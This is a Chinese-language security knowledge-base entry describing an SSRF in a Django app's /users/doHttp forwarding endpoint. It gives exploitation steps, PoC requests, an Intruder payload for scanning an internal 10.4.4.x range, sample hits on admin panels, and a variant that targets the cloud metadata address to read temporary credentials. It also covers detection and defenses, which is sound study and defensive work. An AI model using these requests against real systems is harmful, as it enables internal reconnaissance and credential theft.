---
id: web-generic-ssrf-django-dohttp-url-forward
title: Django /users/doHttp 通用转发 SSRF：url + request_type + params 读取内网 HTTP 服务
type: scenario
domain: web
path: web/generic/ssrf
technique: django-dohttp-url-forward-ssrf
tags:
- web
- ssrf
- django
- python
- requests
- internal-network
- service-discovery
- collaborator
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V248
  verified_at: '2026-11-07T13:17:11+08:00'
  notes: 已对照原文与 19 张图核对：POST /users/doHttp 的 url/request_type/params 转发、Burp Collaborator DNS+HTTP 命中、Django 2.1/nginx 错误回显，以及 10.4.4.x 的 phpMyAdmin、Portainer 10.4.4.15:9000、Zabbix 2.2.16 10.4.4.142:8080、RDP 3389 ConnectionReset 均与图 3-9 一致。未验证点：仅 http/https、无 gopher；原文未继续利用命中的内网服务；Django 2.1 为目标环境版本，非受影响区间。
url: /docs/web/generic/ssrf/web-generic-ssrf-django-dohttp-url-forward/
draft: false
kb_aliases:
- doHttp SSRF
- Django 通用 HTTP 转发
- url 参数 SSRF
- 内网 HTTP 服务探测
- Collaborator 确认 SSRF
- request_type params 转发
---

## 一句话结论

Django 应用的 `/users/doHttp` 接口把请求体中的 `url`、`request_type`、`params` 直接交给服务端 HTTP 客户端代发 GET/POST，且把内网响应内容带回；攻击者用 Burp Collaborator 确认 SSRF 后，可枚举内网网段的 HTTP 服务并读取 phpMyAdmin、Portainer、Zabbix 等页面的响应。

## 原理

- **通用转发端点**：案例的毕业报告系统在“立即开启”时调用 `POST /users/doHttp`，请求体形如 `{"url":"http://10.4.4.x:port/path","request_type":"POST","params":{"security_param":"..."}}`。服务端根据 `url` 发起请求，把 `params` 作为请求参数，并把响应/异常返回给前端。
- **SSRF 确认**：把 `url` 换成 Burp Collaborator 域名，Collaborator 收到 DNS/HTTP 交互，响应中出现 `JSONDecodeError ... <!DOCTYPE html>...` 并回显请求 URL，说明服务端确实发起请求且错误信息带回了目标响应。
- **协议限制**：测试发现只支持 http/https（实现可能是 Python requests），不支持 gopher/file/dict 等；但仍可发送 GET/POST 和参数，足以读取内网 HTTP 服务的响应。
- **内网服务发现**：用 Intruder 把 `url` 设为 `http://10.4.4.$14$:80/` 枚举 1–200，按响应长度/内容筛选；命中 phpMyAdmin 登录页、Portainer 页面、Zabbix 2.2.16 登录页，RDP 3389 返回 ConnectionReset。
- **为什么有危害**：服务端位于内网，能访问攻击者不可达的 HTTP 管理面；响应回显使 SSRF 从“盲探测”升级为“可读内网页面/接口”。若内网服务存在未授权/弱口令，可继续利用；也可用于探测云元数据（若为 http）。

## 触发条件

- 目标存在通用 HTTP 转发/代理接口，`url`、方法、参数完全由客户端控制。
- 接口需要有效会话/CSRF token（案例请求带 `csrftoken`），但任意低权限用户即可调用。
- 服务端未限制目标地址（内网 IP、localhost、云元数据地址均可）。
- 响应内容或错误信息会回显给客户端；若只盲 SSRF，仍可用 Collaborator/时间差探测。
- 服务端可出网到攻击者 Collaborator（用于确认）且能访问内网 HTTP 服务。

## 利用步骤

1. 正常点击功能抓取 `/users/doHttp` 请求，确认 `url`、`request_type`、`params` 字段。
2. 把 `url` 改为 Burp Collaborator 地址，发送后在 Collaborator 查看 DNS/HTTP 交互；检查响应是否回显目标内容或错误。
3. 构造 `url=http://<内网IP>:<端口>/`，用 GET 探测常见 HTTP 端口（80/8080/8000/9000 等）；观察响应长度/内容/错误类型。
4. 对命中的服务读取登录页/接口；若为 phpMyAdmin/Portainer/Zabbix 等，记录版本与路径，评估弱口令/未授权。
5. 用 POST + `params` 向内网接口提交参数（案例的 `security_param` 可继续转发），或改用 `http://169.254.169.254/...` 测试云元数据（若环境支持）。
6. 如响应不回显，改用 Collaborator/时间盲测确认可达性。

## PoC

确认 SSRF：

```http
POST /users/doHttp HTTP/1.1
Host: target
Content-Type: application/json;charset=UTF-8
Cookie: csrftoken=<token>

{
  "url": "http://<collaborator-domain>/",
  "request_type": "GET",
  "params": {"v": "1"}
}
```

内网扫描（Burp Intruder）：

```json
{"url":"http://10.4.4.$14$:80/","request_type":"GET","params":{"v":"1"}}
```

命中示例：

```text
http://10.4.4.142:8080/   -> Zabbix 2.2.16 登录页
http://10.4.4.15:9000/    -> Portainer 页面
http://10.4.4.x:80/       -> phpMyAdmin 登录页
http://10.4.4.23:3389/    -> ConnectionResetError（RDP，非 HTTP）
```

## 变体与关联

- 变体：若响应不回显，使用 Collaborator/自建 HTTP 服务做盲 SSRF；用响应时间/错误类型判断端口开放。
- 变体：支持 POST + 参数时，可直接向内网 API 提交数据，扩大为内网接口利用；若支持 gopher，可打 Redis/MySQL 等（本案例不支持）。
- 变体：目标地址改为 `http://169.254.169.254/latest/meta-data/` 等云元数据地址，读取临时凭据（需环境支持且响应回显）。
- 关联：[[web-generic-ssrf-oa-getrawfile-weak-blacklist]]（URL 参数弱黑名单 SSRF）。
- 关联：[[web-generic-ssrf-avatar-urlopen-internal-service]]（远程 URL 抓取读取内网服务）。
- 关联：[[web-generic-ssrf-connector-imap-website-test-endpoints]]（测试接口直连任意主机）。
- 边界：仅 http/https、无响应回显、目标有出网隔离或内网 ACL 时，危害降级为盲探测；RDP/非 HTTP 服务只能做连通性判断。

## 检测与防御

- **地址白名单**：只允许访问明确的公网域名/IP，解析后校验 IP 不属于私网、回环、链路本地、云元数据段；防止 DNS rebinding。
- **接口收敛**：不要提供通用 HTTP 转发/代理接口；确需转发时限制方法、路径、参数和响应大小。
- **鉴权与审计**：接口要求登录并做角色校验；记录 `url`、调用者、响应大小，监控内网地址访问。
- **网络隔离**：应用服务器限制出网与内网访问范围，元数据服务使用 IMDSv2/最小权限。
- **检测特征**：`url` 参数指向私网/回环/169.254.169.254；同一账号高频枚举不同 IP:端口；响应中出现内网管理页面标题；Collaborator/自建域名解析记录。
